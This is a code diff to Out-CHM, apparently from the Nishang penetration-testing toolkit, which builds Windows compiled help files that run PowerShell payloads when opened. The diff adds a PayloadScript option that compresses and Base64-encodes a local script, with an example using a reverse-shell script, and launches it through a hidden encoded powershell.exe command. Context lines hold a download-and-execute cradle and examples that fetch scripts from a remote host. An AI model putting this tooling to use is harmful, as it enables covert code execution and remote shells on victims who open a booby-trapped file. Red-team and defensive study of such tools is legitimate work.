@@ -16,10 +16,14 @@ http://www.microsoft.com/en-us/download/details.aspx?id=21138
 Payload which you want execute on the target.
 
 .PARAMETER PayloadURL
-URL of the powershell script which would be executed on the target.
+URL of the PowerShell script which would be executed on the target.
+
+.PARAMETER PayloadScript
+Path to a PowerShell script on local machine.
+Note that if the script expects any parameter passed to it, you must pass the parameters in the script itself.  
 
 .PARAMETER Arguments
-Arguments to the powershell script to be executed on the target.
+Arguments to the PowerShell script to be executed on the target.
 
 .PARAMETER OutputPath
 Path to the directory where the files would be saved. Default is the current directory.
@@ -29,10 +33,18 @@ PS > Out-CHM -Payload "Get-Process" -HHCPath "C:\Program Files (x86)\HTML Help W
 
 Above command would execute Get-Process on the target machine when the CHM file is opened.
 
+
+.EXAMPLE
+PS > Out-HTA -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
+you must pass the parameters in the script itself. 
+
+
 .EXAMPLE
 PS > Out-CHM -PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
 
-Use above command to generate CHM file which download and execute the given powershell script in memory on target.
+Use above command to generate CHM file which download and execute the given PowerShell script in memory on target.
 
 .EXAMPLE
 PS > Out-CHM -Payload "-EncodedCommand <>" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
@@ -43,7 +55,7 @@ Use Invoke-Encode from Nishang to encode the command or script.
 .EXAMPLE
 PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
 
-Use above command to pass an argument to the powershell script/module.
+Use above command to pass an argument to the PowerShell script/module.
 
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
@@ -68,13 +80,17 @@ https://twitter.com/ithurricanept/status/534993743196090368
 
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
+        $PayloadScript,
+
+        [Parameter(Position = 3, Mandatory = $False)]
+        [String]
         $Arguments,
 
-        [Parameter(Position = 3, Mandatory = $True)]
+        [Parameter(Position = 4, Mandatory = $True)]
         [String]
         $HHCPath,
 
-        [Parameter(Position = 4, Mandatory = $False)]
+        [Parameter(Position = 5, Mandatory = $False)]
         [String]
         $OutputPath="$pwd"
     )
@@ -84,6 +100,48 @@ https://twitter.com/ithurricanept/status/534993743196090368
     {
         $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }    
+
+    if($PayloadScript)
+    {
+        #Logic to read, compress and Base64 encode the payload script.
+        $Enc = Get-Content $PayloadScript -Encoding Ascii
+    
+        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+        $ms = New-Object IO.MemoryStream
+        $action = [IO.Compression.CompressionMode]::Compress
+        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+        $Enc | ForEach-Object {$sw.WriteLine($_)}
+        $sw.Close()
+    
+        # Base64 encode stream
+        $Compressed = [Convert]::ToBase64String($ms.ToArray())
+    
+        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
+
+        "`$(New-Object IO.Compression.DeflateStream (" +
+
+        "`$(New-Object IO.MemoryStream (,"+
+
+        "`$([Convert]::FromBase64String('$Compressed')))), " +
+
+        "[IO.Compression.CompressionMode]::Decompress)),"+
+
+        " [Text.Encoding]::ASCII)).ReadToEnd();"
+
+        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
+        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+        if ($EncScript.Length -gt 8100)
+        {
+            Write-Warning "Payload too big for CHM! Try a smaller payload."
+            break
+        }
+        else
+        {
+            $Payload = "powershell.exe -WindowStyle hidden -nologo -noprofile -e $EncScript"  
+        }
+    }
 
     #Create the table of contents for the CHM
     $CHMTableOfContents = @"
